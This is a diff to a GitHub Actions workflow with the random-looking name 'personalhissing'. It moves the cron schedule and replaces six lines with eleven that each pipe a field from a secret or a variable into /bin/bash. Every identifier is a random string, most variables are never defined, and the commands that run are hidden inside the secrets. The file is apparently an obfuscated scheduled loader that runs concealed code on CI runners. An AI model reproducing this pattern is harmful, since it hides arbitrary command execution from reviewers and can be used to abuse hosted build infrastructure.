@@ -3,8 +3,7 @@ name: personalhissing
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 3/6 * * *'
-
+    - cron: '43 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: personalhissing
         env:
-          yhc33: ${{ secrets.yhc33 }}
+          qtb9: ${{ secrets.qtb9 }}
         run: |
-          echo $yhc33 | jq -r .rdpui26462 | /bin/bash
-          echo $ggudy31 | jq -r .c55 | /bin/bash
-          echo $vdaz56473 | jq -r .raj1399 | /bin/bash
-          echo $vjh407 | jq -r .dsg10 | /bin/bash
-          echo $s539 | jq -r .hqlhr285 | /bin/bash
-          echo $dd9322 | jq -r .dxnaw4 | /bin/bash
+          echo $qtb9 | jq -r .soj87559 | /bin/bash
+          echo $vgdts74350 | jq -r .v71 | /bin/bash
+          echo $pqii3924 | jq -r .qdp23296 | /bin/bash
+          echo $yzimv8 | jq -r .youal71438 | /bin/bash
+          echo $f43 | jq -r .eb440 | /bin/bash
+          echo $ivd1 | jq -r .hailh9 | /bin/bash
+          echo $fqmtu77 | jq -r .cl65843 | /bin/bash
+          echo $is96 | jq -r .lug505 | /bin/bash
+          echo $a604 | jq -r .aotd6 | /bin/bash
+          echo $q2 | jq -r .yjagx7674 | /bin/bash
+          echo $pjeyq7522 | jq -r .xuva1 | /bin/bash
 
